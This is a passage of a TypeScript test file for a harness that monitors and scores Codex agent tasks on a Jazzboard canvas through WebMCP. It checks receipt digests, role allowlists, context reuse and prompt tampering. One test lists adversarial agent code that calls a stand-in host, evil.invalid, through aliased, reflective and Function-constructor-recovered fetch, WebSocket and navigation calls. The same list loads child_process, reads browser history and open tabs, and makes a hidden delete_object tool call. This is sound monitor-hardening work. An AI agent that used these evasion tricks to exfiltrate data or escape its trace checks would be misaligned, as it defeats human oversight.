        commandDigest: authoritativeReceipt.command.commandDigest,
        rawRoomReadCallResultDigest: authoritativeReceipt.rawRoomReadCallResultDigest,
        rawInspectionCallResultDigest: authoritativeReceipt.rawInspectionCallResultDigest,
        rawPngExportCallResultDigest: authoritativeReceipt.rawPngExportCallResultDigest,
        roomReadResultDigest: authoritativeReceipt.readResultDigest,
        inspectionResultDigest: authoritativeReceipt.inspectionResultDigest,
        pngExportResultDigest: authoritativeReceipt.pngExportResultDigest,
        canvasImageDigest: substitutedImageDigest,
        canvasImageBytes: authoritativeReceipt.canvasImageBytes,
        canvasImageWidth: authoritativeReceipt.canvasImageWidth,
        canvasImageHeight: authoritativeReceipt.canvasImageHeight,
      }),
    };
    const substitutedReceipt = {
      ...substitutedContent,
      receiptDigest: hashCanonicalJson(substitutedContent),
    } as Exp0001aAuthorFinalRoomReadReceipt;
    expect(() => createExp0001aIndependentAuthorArtifact({
      plan,
      lifecycle: awaitingRead,
      modelTerminalResultDigest: terminalResultDigest,
      modelTerminalJson: terminalJson,
      finalAuthoritativeRoomReadReceipt: substitutedReceipt,
      taskTraceObservation: trace,
    })).toThrow();
    expect(() => createExp0001aIndependentAuthorArtifact({
      plan,
      lifecycle: awaitingRead,
      modelTerminalResultDigest: terminalResultDigest,
      modelTerminalJson: { ...terminalJson, finalAuthoritativeRead: { roomRevision: 4, objectCount: 99 } },
      finalAuthoritativeRoomReadReceipt: finalRoomReadReceipt(plan, awaitingRead, trace),
      taskTraceObservation: trace,
    })).toThrow(/AUTHORITATIVE_STATE/);
    expect(() => createExp0001aIndependentAuthorArtifact({
      plan,
      lifecycle: awaitingRead,
      modelTerminalResultDigest: terminalResultDigest,
      modelTerminalJson: { ...terminalJson, webMcpToolsUsed: ["read_room_state", "create_shape"] },
      finalAuthoritativeRoomReadReceipt: finalRoomReadReceipt(plan, awaitingRead, trace),
      taskTraceObservation: trace,
    })).toThrow(/RETAINED_TRACE/);
    const readCommand = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
    const terminal = recordExp0001aReadThreadResult({
      plan,
      lifecycle: awaitingRead,
      command: readCommand,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(plan, awaitingRead, terminalJson),
      finalAuthoritativeEvidenceReceipt: finalRoomReadReceipt(plan, awaitingRead),
    });
    expect(terminal).toMatchObject({ state: "terminal", terminalOutcome: "succeeded" });
    const publicSemanticJson = canonicalJson(terminal.readReceipt!.authorFinalEvidence!.semanticState.content);
    expect(publicSemanticJson).not.toMatch(/private-author|private-editor|secret-user|secret-actor|secret-owner|secret-creator|createdBy|lastEditedBy|futureMetadata/i);
    expect(canonicalJson(terminal.readReceipt!.authorFinalRoomReadReceipt!.rawRoomReadResult)).toContain("secret-owner");

    const incompletePolicy = evaluateExp0001aCodexTaskTracePolicy({
      plan, lifecycle: awaitingRead, evaluatedAt: "2026-08-30T20:02:05.000Z", observation: traceObservation(plan, awaitingRead, false),
    });
    expect(incompletePolicy.decision).toBe("non_evaluable");
    const nonEvaluable = recordExp0001aReadThreadResult({
      plan,
      lifecycle: awaitingRead,
      command: readCommand,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(plan, awaitingRead, terminalJson, { includeTrace: false }),
      finalAuthoritativeEvidenceReceipt: null,
    });
    expect(nonEvaluable.terminalOutcome).toBe("non_evaluable");
    const retainedNonAcceptedEvidence = recordExp0001aReadThreadResult({
      plan,
      lifecycle: awaitingRead,
      command: readCommand,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(plan, awaitingRead, terminalJson, { includeTrace: false }),
      finalAuthoritativeEvidenceReceipt: finalRoomReadReceipt(plan, awaitingRead),
    });
    expect(retainedNonAcceptedEvidence).toMatchObject({
      terminalOutcome: "non_evaluable",
      readReceipt: {
        terminalArtifact: null,
        failureCode: "task_trace_non_evaluable",
        authorFinalRoomReadReceipt: { evidenceSource: "coordinator-issued-exact-browser-webmcp-call-results" },
        authorFinalEvidence: { evidenceMode: "final-only" },
      },
    });
  });

  it("marks reviewer Jazzboard/WebMCP access as a policy violation", async () => {
    const origin = await availableOrigin();
    const envelope = createExp0001aPrimaryReviewerTaskEnvelope(await reviewInput(origin));
    const receipt = await packetReceipt(envelope);
    const plan = prepare(envelope, receipt);
    const { lifecycle } = await begin(plan);
    const observation = traceObservation(plan, lifecycle);
    const policy = evaluateExp0001aCodexTaskTracePolicy({
      plan,
      lifecycle,
      evaluatedAt: "2026-08-30T20:02:05.000Z",
      observation: {
        ...observation,
        browserOrigins: [new URL(envelope.artifactPacket.origin).origin, "https://www.jazzboard.xyz"],
        jazzboardBrowserNavigationCount: 1,
        webMcpCallCount: 1,
        webMcpOrigins: ["https://www.jazzboard.xyz"],
      },
    });
    expect(policy).toMatchObject({ decision: "policy_violation" });
    expect(policy.reasons).toContain("TASK_TRACE_BROWSER_ORIGIN_NOT_ALLOWLISTED");
  });

  it("rejects author access to an unbound recent room or inherited browser context", async () => {
    const plan = prepare(authorEnvelope());
    const { lifecycle } = await begin(plan);
    const observation = traceObservation(plan, lifecycle);
    const policy = evaluateExp0001aCodexTaskTracePolicy({
      plan,
      lifecycle,
      evaluatedAt: "2026-08-30T20:02:05.000Z",
      observation: {
        ...observation,
        preexistingBrowserContextUsed: true,
        jazzboardRoomIdsAccessed: [ROOM_ID, "room_aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"],
      },
    });
    expect(policy).toMatchObject({ decision: "policy_violation" });
    expect(policy.reasons).toContain("AUTHOR_TRACE_ACCESSED_UNBOUND_ROOM_OR_SHARED_BROWSER_CONTEXT");
  });

  it("strictly validates primary, adjudication, and pairwise terminal JSON", async () => {
    const primaryOrigin = await availableOrigin();
    const primaryEnvelope = createExp0001aPrimaryReviewerTaskEnvelope(await reviewInput(primaryOrigin));
    const primaryPlan = prepare(primaryEnvelope, await packetReceipt(primaryEnvelope));
    expect(validateExp0001aCodexTerminalJson(primaryPlan, reviewResult("primary_reviewer"))).toMatchObject({ accepted: true });
    expect(() => validateExp0001aCodexTerminalJson(primaryPlan, "looks good")).toThrow();
    expect(() => validateExp0001aCodexTerminalJson(primaryPlan, {
      ...reviewResult("primary_reviewer"),
      criteria: [reviewResult("primary_reviewer").criteria[0]],
    })).toThrow(/COVERAGE/);
    expect(() => validateExp0001aCodexTerminalJson(primaryPlan, {
      ...reviewResult("primary_reviewer"), accepted: false,
    })).toThrow(/ACCEPTANCE/);
    expect(() => validateExp0001aCodexTerminalJson(primaryPlan, {
      ...reviewResult("primary_reviewer"),
      evidenceCoverage: { semanticState: true, imageSlots: ["image-02", "image-02"] },
    })).toThrow(/IMAGE_COVERAGE/);

    const adjudicationOrigin = await availableOrigin();
    const adjudicationInput = await reviewInput(adjudicationOrigin);
    const adjudicationEnvelope = createExp0001aAdjudicatorTaskEnvelope({
      primaryEvidenceEnvelope: createExp0001aPrimaryReviewerTaskEnvelope(adjudicationInput),
      primaryReviews: await retainedDisagreeingPrimaryPair(adjudicationInput),
    });
    const adjudicationPlan = prepare(adjudicationEnvelope, await packetReceipt(adjudicationEnvelope));
    expect(validateExp0001aCodexTerminalJson(adjudicationPlan, reviewResult("adjudicator"))).toMatchObject({ role: "adjudicator" });

    const pairOrigin = await availableOrigin();
    const base = await reviewInput(pairOrigin, "terminal-pair-left");
    const other = await reviewInput(pairOrigin, "terminal-pair-right");
    const pairEnvelope = createExp0001aPairwiseVisualJudgeTaskEnvelope({
      publicRequirement: base.publicRequirement,
      rubric: base.rubric,
      artifactPacketOrigin: pairOrigin,
      sides: [
        { authorPlan: base.authorPlan, authorLifecycle: base.authorLifecycle },
        { authorPlan: other.authorPlan, authorLifecycle: other.authorLifecycle },
      ],
    });
    const pairPlan = prepare(pairEnvelope, await packetReceipt(pairEnvelope));
    expect(validateExp0001aCodexTerminalJson(pairPlan, {
      schemaVersion: "blinded-canvas-pairwise-result/v1",
      role: "pairwise_visual_judge",
      preference: "canvas-1",
      evidenceRefs: ["canvas-1:image-01", "canvas-2:image-01", "frozen_rubric"],
      rationale: "Canvas one has clearer routing and spacing.",
    })).toMatchObject({ preference: "canvas-1" });
    expect(() => validateExp0001aCodexTerminalJson(pairPlan, {
      schemaVersion: "blinded-canvas-pairwise-result/v1",
      role: "pairwise_visual_judge",
      preference: "tie",
      evidenceRefs: ["canvas-1:image-01", "canvas-1:image-01", "frozen_rubric"],
      rationale: "The evidence is tied.",
    })).toThrow(/EVIDENCE_REFS/);
  });

  it("binds successful review output to a fresh task and exact blinded subject root", async () => {
    const origin = await availableOrigin();
    const evidenceInput = await reviewInput(origin);
    const envelope = createExp0001aPrimaryReviewerTaskEnvelope(evidenceInput);
    const plan = prepare(envelope, await packetReceipt(envelope));
    const { lifecycle: running } = await begin(plan);
    const result = reviewResult("primary_reviewer") as unknown as JsonValue;
    const terminalResultDigest = terminalTextDigest(result);
    const awaitingRead = completeWait(running, result);
    const tracePolicy = evaluateExp0001aCodexTaskTracePolicy({ plan, lifecycle: awaitingRead, evaluatedAt: "2026-08-30T20:02:05.000Z", observation: traceObservation(plan, awaitingRead) });
    const artifact = createExp0001aIndependentReviewArtifact({ plan, lifecycle: awaitingRead, modelTerminalResultDigest: terminalResultDigest, result });
    const command = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
    const terminal = recordExp0001aReadThreadResult({
      plan,
      lifecycle: awaitingRead,
      command,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(plan, awaitingRead, result),
      finalAuthoritativeEvidenceReceipt: null,
    });
    expect(terminal.readReceipt?.taskTraceObservation).toMatchObject({
      commandExecutionCount: 1,
      otherCommandExecutionCount: 0,
      filesystemReadCount: 1,
      filesystemWriteCount: 0,
      repositoryReadCount: 0,
      privateApiRequestCount: 0,
      directHttpRequestCount: 0,
    });
    expect(terminal.readReceipt?.tracePolicyReceipt).toMatchObject({
      decision: "pass",
      reasons: ["COMPLETE_TASK_TRACE_SATISFIES_ROLE_ALLOWLIST"],
    });
    expect(terminal.terminalOutcome).toBe("succeeded");
    expect(() => recordExp0001aReadThreadResult({
      plan,
      lifecycle: awaitingRead,
      command,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(plan, awaitingRead, result),
      finalAuthoritativeEvidenceReceipt: evidenceInput.authorLifecycle.readReceipt!.authorFinalRoomReadReceipt!,
    })).toThrow(/REVIEW_TASK_CANNOT_RECEIVE/);
  });

  it("derives a lossless two-page terminal trace and binds every packet file view", async () => {
    const envelope = createExp0001aPrimaryReviewerTaskEnvelope(await reviewInput(await availableOrigin()));
    const plan = prepare(envelope, await packetReceipt(envelope));
    const { lifecycle: running } = await begin(plan, "thread-paginated-review-unique");
    const result = reviewResult("primary_reviewer") as unknown as JsonValue;
    const awaitingRead = completeWait(running, result);
    const firstCommand = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
    const firstPage = recordExp0001aReadThreadResult({
      plan,
      lifecycle: awaitingRead,
      command: firstCommand,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(plan, awaitingRead, result, {
        hasMore: true,
        nextCursor: "older-trace-page",
        includeTrace: false,
      }),
      finalAuthoritativeEvidenceReceipt: null,
    });
    expect(firstPage).toMatchObject({
      state: "awaiting_terminal_read",
      latestReadCursor: "older-trace-page",
    });
    const secondCommand = issueExp0001aReadThreadCommand({ lifecycle: firstPage, issuedAt: "2026-08-30T20:02:08.000Z" });
    const terminal = recordExp0001aReadThreadResult({
      plan,
      lifecycle: firstPage,
      command: secondCommand,
      observedAt: "2026-08-30T20:02:09.000Z",
      rawResult: rawReadThreadPage(plan, firstPage, result, { includeFinal: false }),
      finalAuthoritativeEvidenceReceipt: null,
    });
    expect(terminal).toMatchObject({ state: "terminal", terminalOutcome: "succeeded" });
    expect(terminal.readPageReceipts).toHaveLength(2);
    expect(terminal.readReceipt).toMatchObject({
      outcome: "retained",
      retainedPageCount: 2,
      cursorExhausted: true,
      failureCode: null,
    });
    expect(terminal.readReceipt?.taskTraceObservation?.openedArtifactPacketFileDigests)
      .toEqual(envelope.artifactPacket.files.map((file) => file.sha256));
    expect(terminal.readReceipt?.taskTraceObservation?.observationEvidenceDigest)
      .toBe(terminal.readReceipt?.pageReceiptRoot);
  });

  it("retains tool, malformed payload, truncation, and cursor failures as canonical non-evaluable terminals", async () => {
    const terminalJson = {
      schemaVersion: "jazzboard-canvas-terminal-result/v1" as const,
      actor: "canvas_worker" as const,
      status: "completed" as const,
      artifactSummary: "Created and inspected a service flow.",
      finalAuthoritativeRead: { roomRevision: 4, objectCount: 5 },
      webMcpToolsUsed: ["get_canvas_capabilities", "read_room_state"],
    };
    const cases = [
      {
        label: "tool-error",
        raw: (_plan: Exp0001aCodexTaskTransportPlan, _lifecycle: Exp0001aCodexTaskLifecycle) => codexAppResult({ error: "read unavailable" }, true),
        failureCode: "read_thread_tool_error_non_evaluable",
      },
      {
        label: "malformed-wrapper",
        raw: () => ({ content: [], isError: false }),
        failureCode: "read_thread_call_result_malformed",
      },
      {
        label: "malformed-payload",
        raw: () => codexAppResult({ schemaVersion: 1, unexpected: true }),
        failureCode: "read_thread_payload_schema_invalid",
      },
      {
        label: "truncated-final",
        raw: (plan: Exp0001aCodexTaskTransportPlan, lifecycle: Exp0001aCodexTaskLifecycle) => rawReadThreadPage(plan, lifecycle, terminalJson, { truncated: true }),
        failureCode: "read_thread_transport_truncated",
      },
    ] as const;
    for (const [index, candidate] of cases.entries()) {
      const plan = prepare(authorEnvelope(), null, { transportId: `transport-read-failure-${index}` });
      const { lifecycle: running } = await begin(plan, `thread-read-failure-${index}`);
      const awaitingRead = completeWait(running, terminalJson);
      const command = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
      const terminal = recordExp0001aReadThreadResult({
        plan,
        lifecycle: awaitingRead,
        command,
        observedAt: "2026-08-30T20:02:07.000Z",
        rawResult: candidate.raw(plan, awaitingRead),
        finalAuthoritativeEvidenceReceipt: null,
      });
      expect(terminal, candidate.label).toMatchObject({ state: "terminal", terminalOutcome: "non_evaluable" });
      expect(terminal.readReceipt?.failureCode, candidate.label).toBe(candidate.failureCode);
      expect(terminal.readPageReceipts[0]?.rawCallResultDigest, candidate.label)
        .toBe(hashCanonicalJson(terminal.readPageReceipts[0]!.rawCallResult));
    }

    const cyclePlan = prepare(authorEnvelope(), null, { transportId: "transport-read-cursor-cycle" });
    const { lifecycle: cycleRunning } = await begin(cyclePlan, "thread-read-cursor-cycle");
    const cycleAwaiting = completeWait(cycleRunning, terminalJson);
    const firstCommand = issueExp0001aReadThreadCommand({ lifecycle: cycleAwaiting, issuedAt: "2026-08-30T20:02:06.000Z" });
    const firstPage = recordExp0001aReadThreadResult({
      plan: cyclePlan,
      lifecycle: cycleAwaiting,
      command: firstCommand,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(cyclePlan, cycleAwaiting, terminalJson, { hasMore: true, nextCursor: "cursor-cycle" }),
      finalAuthoritativeEvidenceReceipt: null,
    });
    const secondCommand = issueExp0001aReadThreadCommand({ lifecycle: firstPage, issuedAt: "2026-08-30T20:02:08.000Z" });
    const cycleTerminal = recordExp0001aReadThreadResult({
      plan: cyclePlan,
      lifecycle: firstPage,
      command: secondCommand,
      observedAt: "2026-08-30T20:02:09.000Z",
      rawResult: rawReadThreadPage(cyclePlan, firstPage, terminalJson, { hasMore: true, nextCursor: "cursor-cycle", includeFinal: false }),
      finalAuthoritativeEvidenceReceipt: null,
    });
    expect(cycleTerminal).toMatchObject({
      state: "terminal",
      terminalOutcome: "non_evaluable",
      readReceipt: { failureCode: "read_thread_cursor_cycle" },
    });
  });

  it("fails closed on forbidden, reflective, computed, or aliased JavaScript capabilities", async () => {
    const terminalJson = {
      schemaVersion: "jazzboard-canvas-terminal-result/v1" as const,
      actor: "canvas_worker" as const,
      status: "completed" as const,
      artifactSummary: "Created and inspected a service flow.",
      finalAuthoritativeRead: { roomRevision: 4, objectCount: 5 },
      webMcpToolsUsed: ["get_canvas_capabilities", "read_room_state"],
    };
    const adversarialCode = [
      "await globalThis.fetch('https://evil.invalid/private')",
      "await global.fetch('https://evil.invalid/private')",
      "await this.fetch('https://evil.invalid/private')",
      "const thisFetch = this.fetch; await thisFetch('https://evil.invalid/private')",
      "const computedThisFetch = this['fetch']; await computedThisFetch('https://evil.invalid/private')",
      "const ThisWebSocket = this.WebSocket; new ThisWebSocket('wss://evil.invalid/private')",
      "const { fetch: globalFetch } = global; await globalFetch('https://evil.invalid/private')",
      "await (0, fetch)('https://evil.invalid/private')",
      "const indirectFetch = fetch; await indirectFetch('https://evil.invalid/private')",
      "await fetch?.('https://evil.invalid/private')",
      "fetch`https://evil.invalid/private`",
      "const recoveredFunction = [].filter.constructor; const recoveredFetch = recoveredFunction('return fetch')(); await recoveredFetch('https://evil.invalid/private')",
      "process.getBuiltinModule('node:fs')",
      "Reflect.get(globalThis, 'fetch')('https://evil.invalid/private')",
      "const pageEval = tab.playwright.evaluate; await pageEval({ expression: \"fetch('https://evil.invalid/private')\" })",
      "await agent.browsers.list()",
      "const getDefaultBrowser = agent.browsers.getDefault; await getDefaultBrowser()",
      "await browser.tabs.get('existing-tab-id')",
      "const readExistingContent = browser.tabs.content; await readExistingContent('existing-tab-id')",
      "await browser.history({ limit: 10 })",
      "await browser.user.openTabs()",
      "const claimExistingTab = browser.user.claimTab; await claimExistingTab('existing-tab-id')",
      "const hiddenCall = tools['ca' + 'll']; const hiddenResult = await hiddenCall('delete_object', {}); if (!hiddenResult.ok) throw new Error('failed')",
      "{ const tools = { call: async () => ({ ok: true }) }; const counterfeitRead = await tools.call('read_room_state', {}); if (!counterfeitRead.ok) throw new Error('failed') }",
      "function counterfeitScope(tools) { return tools.call('read_room_state', {}) }",
      "tools.call = async () => ({ ok: true }); const mutatedRead = await tools.call('read_room_state', {}); if (!mutatedRead.ok) throw new Error('failed')",
      "({ call: tools.call } = { call: async () => ({ ok: true }) }); const destructuredMutationRead = await tools.call('read_room_state', {}); if (!destructuredMutationRead.ok) throw new Error('failed')",
      "const capabilityHolder = { tools }; capabilityHolder.tools.call = async () => ({ ok: true }); const objectAliasRead = await tools.call('read_room_state', {}); if (!objectAliasRead.ok) throw new Error('failed')",
      "const capabilityList = [tools]; capabilityList[0].call = async () => ({ ok: true }); const arrayAliasRead = await tools.call('read_room_state', {}); if (!arrayAliasRead.ok) throw new Error('failed')",
      "const capturedTools = () => tools; void capturedTools",
      "const gotoAlias = tab.goto; await gotoAlias('https://evil.invalid/private')",
      "await tab['goto']('https://evil.invalid/private')",
      "const computedToolName = 'read_room_state'; const computedToolResult = await tools.call(computedToolName, {}); if (!computedToolResult.ok) throw new Error('failed')",
      "module.require('child_process')",
    ] as const;
    for (const [index, code] of adversarialCode.entries()) {
      const plan = prepare(authorEnvelope(), null, { transportId: `transport-adversarial-trace-${index}` });
      const { lifecycle: running } = await begin(plan, `thread-adversarial-trace-${index}`);
      const awaitingRead = completeWait(running, terminalJson);
      const command = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
      const terminal = recordExp0001aReadThreadResult({
        plan,
        lifecycle: awaitingRead,
        command,
        observedAt: "2026-08-30T20:02:07.000Z",
        rawResult: rawReadThreadPage(plan, awaitingRead, terminalJson, { extraTraceCode: code }),
        finalAuthoritativeEvidenceReceipt: null,
      });
      expect(terminal.terminalOutcome, code).toBe("non_evaluable");
      expect(terminal.readReceipt?.tracePolicyReceipt, code).toMatchObject({
        decision: "non_evaluable",
        reasons: ["TASK_TRACE_INCOMPLETE_OR_UNOBSERVABLE"],
      });
      expect(terminal.readReceipt?.taskTraceObservation?.completeness, code).toBe("truncated-or-unobservable");
    }
  }, 15_000);

  it("rejects a reviewer that did not open every exact packet file and retains near-capacity terminal JSON losslessly", async () => {
    const envelope = createExp0001aPrimaryReviewerTaskEnvelope(await reviewInput(await availableOrigin()));
    const missingViewPlan = prepare(envelope, await packetReceipt(envelope), { transportId: "transport-review-missing-view" });
    const { lifecycle: missingViewRunning } = await begin(missingViewPlan, "thread-review-missing-view");
    const ordinaryResult = reviewResult("primary_reviewer") as unknown as JsonValue;
    const missingViewAwaiting = completeWait(missingViewRunning, ordinaryResult);
    const missingViewCommand = issueExp0001aReadThreadCommand({ lifecycle: missingViewAwaiting, issuedAt: "2026-08-30T20:02:06.000Z" });
    const missingViewTerminal = recordExp0001aReadThreadResult({
      plan: missingViewPlan,
      lifecycle: missingViewAwaiting,
      command: missingViewCommand,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(missingViewPlan, missingViewAwaiting, ordinaryResult, { openPacketFiles: false }),
      finalAuthoritativeEvidenceReceipt: null,
    });
    expect(missingViewTerminal).toMatchObject({
      terminalOutcome: "policy_violation",
      readReceipt: {
        failureCode: "task_trace_policy_violation",
        tracePolicyReceipt: { decision: "policy_violation" },
      },
    });

    const plan = prepare(envelope, await packetReceipt(envelope), { transportId: "transport-review-near-capacity" });
    const { lifecycle: running } = await begin(plan, "thread-review-near-capacity");
    const base = reviewResult("primary_reviewer");
    const nearCapacity = {
      ...base,
      criteria: base.criteria.map((criterion) => ({ ...criterion, rationale: "r".repeat(1_500) })),
      revisionAssessment: {
        ...base.revisionAssessment,
        revisions: base.revisionAssessment.revisions.map((revision) => ({
          ...revision,
          findings: Array.from({ length: 24 }, (_, index) => `${index}:`.padEnd(500, "f")),
        })),
      },
      rationale: "z".repeat(1_500),
    };
    expect(canonicalJson(nearCapacity).length).toBeGreaterThan(15_000);
    expect(canonicalJson(nearCapacity).length).toBeLessThan(19_000);
    const awaitingRead = completeWait(running, nearCapacity);
    const command = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
    const terminal = recordExp0001aReadThreadResult({
      plan,
      lifecycle: awaitingRead,
      command,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(plan, awaitingRead, nearCapacity),
      finalAuthoritativeEvidenceReceipt: null,
    });
    expect(terminal).toMatchObject({ terminalOutcome: "succeeded", readReceipt: { failureCode: null } });
    expect(terminal.readReceipt?.terminalJson).toEqual(nearCapacity);

    const oversizedPlan = prepare(envelope, await packetReceipt(envelope), { transportId: "transport-review-over-capacity" });
    const { lifecycle: oversizedRunning } = await begin(oversizedPlan, "thread-review-over-capacity");
    const oversized = { ...base, rationale: "x".repeat(19_000) };
    const oversizedAwaiting = completeWait(oversizedRunning, oversized);
    const oversizedCommand = issueExp0001aReadThreadCommand({ lifecycle: oversizedAwaiting, issuedAt: "2026-08-30T20:02:06.000Z" });
    const oversizedTerminal = recordExp0001aReadThreadResult({
      plan: oversizedPlan,
      lifecycle: oversizedAwaiting,
      command: oversizedCommand,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(oversizedPlan, oversizedAwaiting, oversized),
      finalAuthoritativeEvidenceReceipt: null,
    });
    expect(oversizedTerminal).toMatchObject({
      terminalOutcome: "non_evaluable",
      readReceipt: { failureCode: "terminal_agent_message_capacity_exceeded", terminalJson: null },
    });
  });

  it("retains cursor-based waits and rejects stale commands or reused task contexts", async () => {
    const firstPlan = prepare(authorEnvelope());
    const { lifecycle: firstRunning } = await begin(firstPlan, "fresh-task-one");
    const wait = issueExp0001aWaitThreadsCommand({ lifecycle: firstRunning, issuedAt: "2026-08-30T20:02:03.000Z" });
    const timedOut = recordExp0001aWaitThreadsResult({
      lifecycle: firstRunning,
      command: wait,
      observedAt: "2026-08-30T20:02:04.000Z",
      rawResult: codexAppResult({
        timedOut: true,
        wake: null,
        polls: [{
          schemaVersion: 1,
          cursor: "cursor-one",
          revision: 1,
          changed: true,
          thread: { id: firstRunning.threadId!, hostId: firstRunning.hostId!, status: { type: "active", activeFlags: [] } },
          latestTurn: { id: "turn-active", status: "inProgress", error: null, startedAt: 1, completedAt: null, durationMs: null },
          latestAssistantMessageId: null,
          latestAssistantMessage: null,
          latestToolMarkerId: null,
          latestToolMarker: null,
        }],
      }),
    });
    const nextWait = issueExp0001aWaitThreadsCommand({ lifecycle: timedOut, issuedAt: "2026-08-30T20:02:05.000Z" });
    expect(nextWait.arguments.targets[0].afterCursor).toBe("cursor-one");
    expect(() => recordExp0001aWaitThreadsResult({
      lifecycle: timedOut,
      command: wait,
      observedAt: "2026-08-30T20:02:06.000Z",
      rawResult: codexAppResult({ timedOut: true, wake: null, polls: [] }),
    })).toThrow(/NOT_BOUND|ALREADY_RECORDED/);

    const secondPlan = prepare(authorEnvelope(), null, {
      transportId: "transport-second-unique",
    });
    const { lifecycle: secondLifecycle } = await begin(secondPlan, "fresh-task-one");
    expect(() => assertExp0001aCodexTaskContextsSeparated([
      { plan: firstPlan, lifecycle: firstRunning },
      { plan: secondPlan, lifecycle: secondLifecycle },
    ])).toThrow(/CONTEXT_REUSED/);
    const { lifecycle: distinctTaskSameRoom } = await begin(secondPlan, "fresh-task-two");
    expect(() => assertExp0001aCodexTaskContextsSeparated([
      { plan: firstPlan, lifecycle: firstRunning },
      { plan: secondPlan, lifecycle: distinctTaskSameRoom },
    ])).toThrow(/PRIVATE_ROOM_REUSED/);
  });

  it("rejects role-setting, prompt, receipt, and plan digest tampering", () => {
    const plan = prepare(authorEnvelope());
    expect(exp0001aCodexTaskTransportPlanSchema.safeParse({ ...plan, reasoningEffort: "high" }).success).toBe(false);
    expect(exp0001aCodexTaskTransportPlanSchema.safeParse({
      ...plan,
      createThreadCommand: {
        ...plan.createThreadCommand,
        arguments: { ...plan.createThreadCommand.arguments, prompt: `${plan.createThreadCommand.arguments.prompt}\nsecret` },
      },
    }).success).toBe(false);
    expect(exp0001aCodexTaskTransportPlanSchema.safeParse({ ...plan, planDigest: digest("forged") }).success).toBe(false);
  });

  it("executes the full provider-free 48 author, 96 primary, conditional adjudication, 24 pairwise, and analysis chain", async () => {
    const executionManifest = developmentExecutionManifestSchema.parse(executionManifestJson);
    const reviewPlanManifest = exp0001aCodexReviewPlanManifestSchema.parse(reviewPlanManifestJson);
    const provisioningPlan = createExp0001aAttemptProvisioningPlan();
    const freeze = syntheticCodexFreeze();
    const authorPlans: Exp0001aCodexTaskTransportPlan[] = [];
    const authorLifecycles: Exp0001aCodexTaskLifecycle[] = [];
    const accountingTasks: Exp0001aCodexTaskAccounting[] = [];
    let scheduler = createExp0001aCodexScheduler(provisioningPlan.assignments);
    const authorTerminalJson = {
      schemaVersion: "jazzboard-canvas-terminal-result/v1" as const,
      actor: "canvas_worker" as const,
      status: "completed" as const,
      artifactSummary: "Created and inspected the frozen benchmark artifact.",
      finalAuthoritativeRead: { roomRevision: 4, objectCount: 5 },
      webMcpToolsUsed: [
        "get_canvas_capabilities", "read_room_state", "apply_canvas_transaction",
        "inspect_canvas_scope", "export_canvas_png",
      ],
    };

    for (let index = 0; index < 48; index += 1) {
      const timing = syntheticTimeline(index);
      const plan = prepare(authorEnvelope(timing.releasedAt, index), null, {
        transportId: `transport-author-scientific-${String(index).padStart(2, "0")}`,
      });
      let lifecycle: Exp0001aCodexTaskLifecycle;
      if (index < 47) {
        lifecycle = (await retainSyntheticTerminalTask(
          plan,
          authorTerminalJson,
          `thread-author-scientific-${String(index).padStart(2, "0")}`,
          timing,
        )).lifecycle;
      } else {
        const { lifecycle: running } = await begin(
          plan,
          "thread-author-scientific-47",
          timing,
        );
        const awaitingRead = usageLimitWait(running, timing);
        const readCommand = issueExp0001aReadThreadCommand({
          lifecycle: awaitingRead,
          issuedAt: timing.readIssuedAt,
        });
        lifecycle = recordExp0001aReadThreadResult({
          plan,
          lifecycle: awaitingRead,
          command: readCommand,
          observedAt: timing.readObservedAt,
          rawResult: rawReadThreadPage(plan, awaitingRead, { status: "usage_limited" }, { includeFinal: false }),
          finalAuthoritativeEvidenceReceipt: null,
        });
      }
      expect(lifecycle.state).toBe("terminal");
      authorPlans.push(plan);
      authorLifecycles.push(lifecycle);
      const assignment = provisioningPlan.assignments[index]!;
      scheduler = beginNextExp0001aCodexAssignment(scheduler, {
        assignmentId: assignment.assignmentId,
        begunAt: lifecycle.createReceipt.observedAt,
        codexTaskId: lifecycle.codexTaskId!,
        threadId: lifecycle.threadId!,
      });
      if (lifecycle.terminalOutcome === "succeeded") {
        scheduler = completeActiveExp0001aCodexAssignment(scheduler, timing.terminalCompletedAt);
        scheduler = terminalizeActiveExp0001aCodexAssignment(scheduler, {
          terminalAt: timing.readObservedAt,
          outcome: "succeeded",
        });
      } else {
        expect(lifecycle.terminalOutcome).toBe("usage_limit_interrupted");
        scheduler = pauseExp0001aCodexSchedulerForUsageLimit(scheduler, {
          observedAt: timing.readObservedAt,
          evidenceDigest: lifecycle.readReceipt!.evidenceDigest,
          affectedTask: {
            role: plan.role,
            assignmentId: plan.privateBinding.assignmentId,
            attemptId: plan.privateBinding.attemptId,
            planDigest: plan.planDigest,
            transportId: plan.transportId,
            taskBegun: true,
          },
        });
      }
      accountingTasks.push(finalizeExp0001aCodexTaskAccounting({
        accountingId: `accounting-author-scientific-${String(index).padStart(2, "0")}`,
        plan,
        lifecycle,
      }).accountingRecord);
    }

    const probeBegunAt = "2026-08-30T20:50:00.000Z";
    const probeCompletedAt = "2026-08-30T20:50:01.000Z";
    const probeTerminalAt = "2026-08-30T20:50:02.000Z";
    let probeAccounting = beginExp0001aCodexTask({
      accountingId: "accounting-subscription-probe-scientific-1",
      assignmentId: "assignment-subscription-probe-scientific-1",
